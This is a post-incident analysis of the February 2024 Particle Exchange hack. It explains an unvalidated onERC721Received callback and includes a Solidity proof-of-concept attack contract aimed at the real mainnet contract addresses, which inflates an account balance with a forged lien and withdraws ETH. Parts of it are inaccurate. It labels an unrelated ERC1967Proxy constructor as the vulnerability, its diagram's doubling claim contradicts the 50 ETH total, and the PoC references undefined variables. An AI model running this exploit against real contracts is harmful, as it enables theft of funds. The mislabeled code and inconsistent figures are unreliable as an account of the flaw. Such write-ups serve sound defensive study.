# Particle Trade — onERC721Received Vulnerability via Malicious Lien

| Field | Details |
|------|------|
| **Date** | 2024-02 |
| **Protocol** | Particle Exchange |
| **Chain** | Ethereum |
| **Loss** | ~50 ETH |
| **Attacker** | [0x2c903f97](https://etherscan.io/address/0x2c903f97ea69b393ea03e7fab8d64d722b3f5559) |
| **Attack Contract** | [0xe55607b2](https://etherscan.io/address/0xe55607b2967ddbe5fa9a6a921991545b8277ef8f) |
| **Vulnerable Contract** | [Proxy 0x7c5C9Af](https://etherscan.io/address/0x7c5C9AfEcf4013c43217Fb6A626A4687381f080D) |
| **Implementation Contract** | [0xE4764f9c](https://etherscan.io/address/0xE4764f9cd8ECc9659d3abf35259638B20ac536E4) |
| **Azuki NFT** | [0xB6a37b5d](https://etherscan.io/address/0xB6a37b5d14D502c3Ab0Ae6f3a0E058BC9517786e) |
| **Root Cause** | Created a zero-parameter Lien via `offerBid()`, passed maliciously encoded Lien data into `onERC721Received()` to manipulate account balances, then drained ETH via `withdrawAccountBalance()` |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/ParticleTrade_exp.sol) |

---

## 1. Vulnerability Overview

Particle Exchange's NFT lending/swap contract fails to sufficiently validate Lien data passed into the `onERC721Received()` callback. The attacker first created a zero-parameter Lien via `offerBid()`, then passed a maliciously encoded Lien struct into `onERC721Received()` via `safeTransferFrom()` to inflate the account balance, subsequently withdrawing ~50 ETH via `withdrawAccountBalance()`.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: Lien data not validated in onERC721Received
struct Lien {
    address borrower;
    address collection;
    uint256 tokenId;
    uint256 price;
    uint256 rate;
    uint256 loanStartTime;
    uint256 credit;
    uint256 lienId;
}

function onERC721Received(
    address,
    address from,
    uint256 tokenId,
    bytes calldata data  // ← attacker can inject arbitrary Lien data
) external returns (bytes4) {
    Lien memory lien = abi.decode(data, (Lien));
    // No validation of lien.price, lien.credit, etc.
    accountBalance[lien.borrower] += lien.credit;  // ← balance inflated arbitrarily
    return this.onERC721Received.selector;
}

// ✅ Safe code: strict Lien data validation
function onERC721Received(
    address,
    address from,
    uint256 tokenId,
    bytes calldata data
) external returns (bytes4) {
    Lien memory lien = abi.decode(data, (Lien));
    // Validate: lienId actually exists, from is the borrower, tokenId matches
    require(liens[lien.lienId].borrower == from, "invalid lien borrower");
    require(liens[lien.lienId].tokenId == tokenId, "invalid lien tokenId");
    require(liens[lien.lienId].credit == lien.credit, "invalid lien credit");
    // ...
    return this.onERC721Received.selector;
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: ERC1967Proxy.sol
contract ERC1967Proxy is Proxy, ERC1967Upgrade {
    /**
     * @dev Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
     *
     * If `_data` is nonempty, it's used as data in a delegate call to `_logic`. This will typically be an encoded
     * function call, and allows initializing the storage of the proxy like a Solidity constructor.
     */
    constructor(address _logic, bytes memory _data) payable {  // ❌ vulnerability
        _upgradeToAndCall(_logic, _data, false);
    }

    /**
     * @dev Returns the current implementation address.
     */
    function _implementation() internal view virtual override returns (address impl) {
        return ERC1967Upgrade._getImplementation();
    }
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Call offerBid(0, 0, 0, ...)
  │         └─ Creates a Lien ID with zero parameters
  │
  ├─→ [2] Encode malicious Lien struct
  │         └─ credit = 50 ETH, borrower = attacker
  │
  ├─→ [3] NFT.safeTransferFrom(attacker, contract, tokenId, maliciousData)
  │         └─ Triggers onERC721Received() callback
  │
  ├─→ [4] onERC721Received(): decodes data and inflates balance
  │         └─ accountBalance[attacker] += 50 ETH (no validation)
  │
  ├─→ [5] onERC721Received() called twice to double the balance
  │
  ├─→ [6] Call withdrawAccountBalance()
  │         └─ Withdraws inflated 50 ETH balance
  │
  └─→ [7] ~50 ETH profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IParticleExchange {
    struct Lien {
        address borrower;
        address collection;
        uint256 tokenId;
        uint256 price;
        uint256 rate;
        uint256 loanStartTime;
        uint256 credit;
        uint256 lienId;
    }
    function offerBid(
        address collection, uint256 margin, uint256 endTime,
        uint256 rate, uint256 loanDuration
    ) external payable returns (uint256 lienId);
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4);
    function withdrawAccountBalance() external;
    function accountBalance(address) external view returns (uint256);
}

contract AttackContract {
    IParticleExchange constant particle = IParticleExchange(0x7c5C9AfEcf4013c43217Fb6A626A4687381f080D);
    IERC721           constant azuki    = IERC721(0xB6a37b5d14D502c3Ab0Ae6f3a0E058BC9517786e);

    function testExploit() external {
        // [1] Create a zero-parameter Lien
        uint256 lienId = particle.offerBid(address(azuki), 0, 0, 0, 0);

        // [2] Encode malicious Lien
        IParticleExchange.Lien memory maliciousLien = IParticleExchange.Lien({
            borrower: address(this),
            collection: address(azuki),
            tokenId: targetTokenId,
            price: 0,
            rate: 0,
            loanStartTime: 0,
            credit: 50 ether,  // ← arbitrary balance set
            lienId: lienId
        });

        // [3] Pass malicious data via safeTransferFrom
        bytes memory data = abi.encode(maliciousLien);
        azuki.safeTransferFrom(address(this), address(particle), targetTokenId, data);
        azuki.safeTransferFrom(address(this), address(particle), targetTokenId2, data);

        // [4] Withdraw inflated balance
        particle.withdrawAccountBalance();
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | onERC721Received callback data not validated |
| **CWE** | CWE-20: Improper Input Validation |
| **Attack Vector** | External (safeTransferFrom + malicious callback data) |
| **DApp Category** | NFT lending/swap protocol |
| **Impact** | Arbitrary account balance manipulation leading to ETH theft |

## 6. Remediation Recommendations

1. **Strict Lien data validation**: Inside `onERC721Received()`, cross-reference the decoded lienId against the on-chain stored Lien
2. **Restrict to trusted callers only**: Limit `onERC721Received()` so it can only be invoked from Particle Exchange's internal logic
3. **Separate credit calculation**: Process balance increases in a dedicated function with validation before execution
4. **NFT transfer whitelist**: Only process tokens from whitelisted collections inside `onERC721Received()`

## 7. Lessons Learned

- The `onERC721Received()` callback accepts arbitrary bytes data; whenever this data is decoded to modify state variables, it must be cross-validated against on-chain state.
- Patterns that create Liens without initial conditions — such as `offerBid()` — become entry points for malicious lienId reuse attacks.
- In NFT lending protocols, callback data must always be treated as untrusted input.